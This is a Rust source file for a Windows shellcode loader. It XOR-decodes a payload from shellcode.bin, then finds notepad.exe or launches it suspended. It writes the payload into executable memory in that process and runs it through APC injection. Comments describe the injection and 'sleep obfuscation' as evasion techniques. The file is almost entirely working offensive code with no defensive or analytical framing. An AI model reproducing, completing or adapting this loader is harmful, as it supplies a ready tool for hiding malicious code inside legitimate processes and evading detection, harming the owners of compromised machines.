
```rust
// cargo build --target x86_64-pc-windows-gnu --release

use std::fs::File;
use std::io::{Read, Result};
use std::ffi::{CString, OsStr};     
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::ptr::{null, null_mut};
use std::{thread, time};

use winapi::shared::minwindef::{DWORD, FALSE, LPVOID};
use winapi::shared::ntdef::NULL;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualAlloc};
use winapi::um::processthreadsapi::{
    CreateProcessW, GetThreadId, OpenProcess, OpenThread, QueueUserAPC, ResumeThread, CreateThread, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::synchapi::{Sleep, WaitForSingleObject};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, Thread32First, Thread32Next, PROCESSENTRY32W, THREADENTRY32,
    TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD,
};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS, THREAD_SET_CONTEXT};

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(once(0)).collect()
}


// APC injection
// Early Bird/ Early Cascade Injection
// XOR encryption
// Sleep obfuscation
// If an existing notepad.exe doesnt exist then it creates one in a suspended state and injects the shellcode into it.


// Sleep obfuscation: XOR-based time delay
fn sleep_obfuscation(ms: u64) {
    let key = 0xA5A5A5A5u64;
    let mut t = ms ^ key;
    t ^= key;
    thread::sleep(time::Duration::from_millis(t));
}

// XOR decrypt in-place
fn xor_decrypt(data: &mut [u8], key: u8) {
    for b in data.iter_mut() {
        *b ^= key;
    }
}

// Enumerate processes and return PID of the first process matching the name
fn find_process_by_name(target: &str) -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return None;
        }
        loop {
            let exe_name = String::from_utf16_lossy(
                &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(0)],
            );
            if exe_name.eq_ignore_ascii_case(target) {
                CloseHandle(snapshot);
                return Some(entry.th32ProcessID);
            }
            if Process32NextW(snapshot, &mut entry) == FALSE {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    None
}

// Enumerate threads for a given PID
fn enumerate_threads(pid: DWORD) -> Vec<DWORD> {
    let mut tids = Vec::new();
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return tids;
        }
        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        if Thread32First(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return tids;
        }
        loop {
            if entry.th32OwnerProcessID == pid {
                tids.push(entry.th32ThreadID);
            }
            if Thread32Next(snapshot, &mut entry) == FALSE {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    tids
}

const INVALID_HANDLE_VALUE: *mut winapi::ctypes::c_void = -1isize as *mut _;

// Early Cascade Injection: allocate memory, write shellcode, queue APC
fn inject_earlycascade(pid: DWORD, h_process: winapi::um::winnt::HANDLE, shellcode: &mut [u8]) {
    // Decrypt shellcode in memory
    let xor_key: u8 = 0xAA;
    xor_decrypt(shellcode, xor_key);

    unsafe {
        // 1. Allocate memory in target process
        let remote_mem = VirtualAllocEx(
            h_process,
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_mem.is_null() {
            println!("VirtualAllocEx failed.");
            return;
        }
        // 2. Write shellcode
        let mut written = 0;
        let res = WriteProcessMemory(
            h_process,
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut written,
        );
        if res == FALSE || written != shellcode.len() {
            println!("WriteProcessMemory failed.");
            return;
        }
        println!("Shellcode written to remote process.");

        // 3. Sleep obfuscation before injection
        println!("Sleeping (obfuscated) before APC injection...");
        sleep_obfuscation(1500);

        // 4. Enumerate threads and queue APC
        let tids = enumerate_threads(pid);
        let mut injected = false;
        for tid in tids {
            let h_thread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
            if h_thread.is_null() {
                continue;
            }
            let apc_res = QueueUserAPC(Some(std::mem::transmute(remote_mem)), h_thread, 0);
            if apc_res == 0 {
                CloseHandle(h_thread);
                continue;
            }
            println!("APC queued to thread {}", tid);
            injected = true;
            CloseHandle(h_thread);
        }
        if !injected {
            println!("Failed to queue APC to any thread.");
        }
    }
}

// Read shellcode from file and encrypt it with XOR key
fn load_and_encrypt_shellcode(path: &str, key: u8) -> Result<Vec<u8>> {
    let mut file = File::open(path)?;
    let mut buf = Vec::new();
    file.read_to_end(&mut buf)?;
    // Encrypt for in-memory decryption (to match loader logic)
    for b in buf.iter_mut() {
        *b ^= key;
    }
    Ok(buf)
}

fn main() {
    // Load and encrypt shellcode from shellcode.bin
    let xor_key: u8 = 0xAA;
    let mut shellcode = match load_and_encrypt_shellcode("shellcode.bin", xor_key) {
        Ok(buf) => buf,
        Err(e) => {
            println!("Failed to load shellcode: {}", e);
            return;
        }
    };

    let target_process = "notepad.exe";
    let pid = match find_process_by_name(target_process) {
        Some(pid) => pid,
        None => {
            println!("Target process not found, launching new one...");
            let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
            let app = to_wide(target_process);
            let success = unsafe {
                CreateProcessW(
                    null_mut(),
                    app.as_ptr() as *mut u16,
                    null_mut(),
                    null_mut(),
                    FALSE,
                    CREATE_SUSPENDED,
                    null_mut(),
                    null_mut(),
                    &mut si,
                    &mut pi,
                )
            };
            if success == FALSE {
                println!("Failed to create process.");
                return;
            }
            println!("Created process {} in suspended state.", target_process);
            inject_earlycascade(pi.dwProcessId, pi.hProcess, &mut shellcode);
            unsafe {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            return;
        }
    };

    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if h_process.is_null() {
            println!("Failed to open target process.");
            return;
        }
        inject_earlycascade(pid, h_process, &mut shellcode);
        CloseHandle(h_process);
    }
}
```